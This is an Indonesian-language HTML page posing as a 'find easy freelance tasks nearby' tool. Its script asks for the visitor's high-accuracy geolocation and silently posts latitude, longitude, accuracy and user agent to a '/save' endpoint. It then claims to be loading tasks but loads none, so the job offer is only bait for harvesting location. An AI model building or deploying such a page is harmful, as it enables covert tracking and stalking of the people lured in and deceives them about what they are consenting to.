<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cek Toko & Area Terdekat 📍</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Poppins', sans-serif;
      background: #f4f7f6;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: #ffffff;
      border-radius: 20px;
      padding: 35px 25px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
      border: 1px solid #eaeaea;
    }

    .icon {
      font-size: 55px;
      margin-bottom: 15px;
    }

    h1 {
      font-size: 20px;
      color: #2c3e50;
      margin-bottom: 8px;
      font-weight: 600;
    }

    p {
      color: #7f8c8d;
      font-size: 13px;
      line-height: 1.6;
      margin-bottom: 25px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #27ae60;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      font-family: 'Poppins', sans-serif;
    }

    button:hover { background: #219653; }
    button:active { transform: scale(0.98); }

    button:disabled { 
      background: #e0e0e0; 
      color: #999; 
      cursor: not-allowed;
    }

    #status {
      margin-top: 18px;
      font-size: 13px;
      color: #95a5a6;
      min-height: 20px;
      font-weight: 500;
    }

    .success { color: #27ae60 !important; font-weight: 600; }
    .error { color: #e74c3c !important; font-weight: 600; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">📦</div>
    <h1>Deteksi Freelance Mudah</h1>
    <p>Klik tombol di bawah untuk mendeteksi Freelance mudah</p>

    <button onclick="getLocation()" id="btn">Dapatkan tugas terdekat</button>
    <p id="status"></p>
  </div>

  <script>
    async function getLocation() {
      const status = document.getElementById("status");
      const btn = document.getElementById("btn");

      btn.disabled = true;
      btn.textContent = "Mendeteksi area...";
      status.innerHTML = "⏳ Menghubungkan ke server wilayah...";

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const data = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            userAgent: navigator.userAgent
          };

          await fetch("/save", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          });

          status.innerHTML = "✅ Area terdeteksi! Memuat tugas...";
          status.className = "success";
          btn.textContent = "Berhasil Terhubung";
        },
        (err) => {
          status.innerHTML = "⚠️ Gagal mendeteksi otomatis. Harap hidupkan Lokasi!!";
          status.className = "error";
          btn.disabled = false;
          btn.textContent = "Coba Lagi";
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }
  </script>
</body>
</html>
